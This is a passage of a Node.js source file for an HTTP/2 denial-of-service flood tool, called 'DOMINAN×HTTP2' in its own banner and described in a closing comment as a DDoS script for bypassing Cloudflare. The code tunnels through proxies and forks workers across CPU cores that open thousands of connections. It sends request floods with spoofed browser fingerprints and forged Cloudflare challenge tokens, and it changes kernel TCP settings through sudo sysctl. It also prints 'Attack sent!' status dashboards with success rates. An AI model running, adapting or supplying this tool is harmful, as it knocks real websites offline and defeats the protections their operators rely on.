                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {

                                        //console.log("goaway", frame.payload.readUint32BE(0), frame.payload.readUint32BE(4))

                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                }
                                tlsSocket.write(encodeRstStream(0, 3, 0)); // beta
                                tlsSocket.end(() => tlsSocket.destroy()) // still beta
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    //const fwq = getRandomInt(0,1);
                    const requests = []
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }
                    let ratelimit;
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(1, 90);
                    } else {
                        ratelimit = process.argv[6];
                    }
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        const browserVersion = getRandomInt(120, 123);

                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        let brandValue;
                        if (browserVersion === 120) {
                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 122) {
                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 123) {
                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                        }

                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave
                            ? 'en-US,en;q=0.9'
                            : 'en-US,en;q=0.7';

                        const secGpcValue = isBrave ? "1" : undefined;

                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaPlatform = isBrave ? 'Windows' : undefined;
                        const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        }).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": generateUserAgent(),
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": langValue,
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        const headers3 = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        }).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": generateUserAgent(),
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                            "sec-fetch-site": currentRefererValue ? ref1 : "none",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-user": "?1",
                            "sec-fetch-dest": "document",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": langValue,
                            //...(Math.random() < 0.4 && { "priority": `u=${fwq}, i` }),
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        const combinedHeaders = useLegitHeaders ? headers3.concat() : headers.concat(headers2);

                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWrite()
                            }, isFull ? 1000 : 1000 / ratelimit)
                        }
                    })
                }

                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}


function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}


setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {

        
    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.clear()
    console.log(`
        \x1b[3;31;40m                            \x1b[38;5;250mAttack sent!
        \x1b[3;31;40m                    \x1b[1;37mAttack order sent by: RIFKIOFFICIALLL
        
        \x1b[3;31;40m               \x1b[38;5;199mHOST      : \x1b[0m\x1b[38;5;46m${url.hostname}
        \x1b[3;31;40m               \x1b[38;5;93mDURATION  : \x1b[0m\x1b[38;5;46m${time}
        \x1b[3;31;40m               \x1b[38;5;57mRATE      : \x1b[0m\x1b[38;5;46m${ratelimit}
        \x1b[3;31;40m               \x1b[38;5;51mTHREADS   : \x1b[0m\x1b[38;5;46m${threads}
        \x1b[3;31;40m               \x1b[38;5;4mMETHOD    : \x1b[0m\x1b[38;5;46m${reqmethod}
        \x1b[3;31;40m               \x1b[38;5;85mScript    : \x1b[0m\x1b[38;5;46mDOMINAN×HTTP2\x1b[0m
        \x1b[3;31;40m               \x1b[38;5;107mINCLUDES  : \x1b[0m\x1b[38;5;46m${
            url.hostname.includes('cloudflare') ? 'cloudflare' : ''}${url.hostname.includes('akamai') ? 'akamai' : ''}${url.hostname.includes('fastly') ? 'fastly' : ''}${url.hostname.includes('sucuri') ? 'sucuri' : ''}${!url.hostname.includes('cloudflare') && !url.hostname.includes('akamai') && !url.hostname.includes('fastly') && !url.hostname.includes('sucuri') ? 'amazon' : ''}
        `.slice(0, -2) // Remove the last comma
);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    function displayDebugInfo(statuses, startTime, totalTime) {
        console.clear();
        console.log('\x1b[36m╔════════════════════════════════════════════════════╗');
        console.log('\x1b[36m║          BYPASSED ATTACK ONLINE              ║');
        console.log('\x1b[36m╚════════════════════════════════════════════════════╝\n');
    
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const progress = Math.min(100, Math.floor((elapsed / totalTime) * 100));
        const totalRequests = Object.values(statuses).reduce((sum, val) => sum + (val || 0), 0);
        const successCount = (statuses['200'] || 0) + (statuses['301'] || 0) + (statuses['302'] || 0) + (statuses['502'] || 0) + (statuses['522'] || 0) + (statuses['503'] || 0);
        const successRate = totalRequests > 0 ? ((successCount / totalRequests) * 100).toFixed(2) : 0;
    
        console.log('\x1b[33mTarget:\x1b[0m', url.hostname);
        console.log('\x1b[33mMethod:\x1b[0m', reqmethod);
        console.log('\x1b[33mProgress:\x1b[0m', `${progress}% (${elapsed}/${totalTime}s)`);
        console.log('\x1b[33mSuccess Rate:\x1b[0m', `${successRate}%`);
        console.log('\x1b[33mTotal Requests:\x1b[0m', totalRequests);
    
        console.log('┌──────────┬──────────┐');
        console.log('│ Status   │ Count    │');
        console.log('├──────────┼──────────┤');
    
        if (Object.keys(statuses).length === 0) {
            console.log('\x1b[31m│ No Data  │ 0        │\x1b[0m');
        } else {
            for (const [code, count] of Object.entries(statuses)) {
                let color = '\x1b[32m';
                if (code.startsWith('4') || code === 'GOAWAY') color = '\x1b[31m';
                if (code.startsWith('5')) color = '\x1b[33m';
                console.log(`${color}│ ${code.padEnd(8)} │ ${count.toString().padEnd(8)} │\x1b[0m`);
            }
        }
        console.log('├──────────┴──────────┤');
        console.log(
            'BYPASS ON '
          );      
        console.log('└──────────┴──────────┘');
    }
    
    if (debugMode) {
        setInterval(() => {
            let aggregatedStatuses = {};
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            aggregatedStatuses[code] = (aggregatedStatuses[code] || 0) + st[code];
                        }
                    }
                }
            }
            displayDebugInfo(aggregatedStatuses, timestamp, time);
        }, 1000);
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(0), time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        go()
    }, delay);


    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(p), time * 1000);
}
setTimeout(() => {
  console.log('[✓] Serangan selesai.');
  process.exit(0);
}, time * 1000);
/*
script ddos by @smsbinhvn
This script is a part of the bypassing http ddos cloudflare.
*/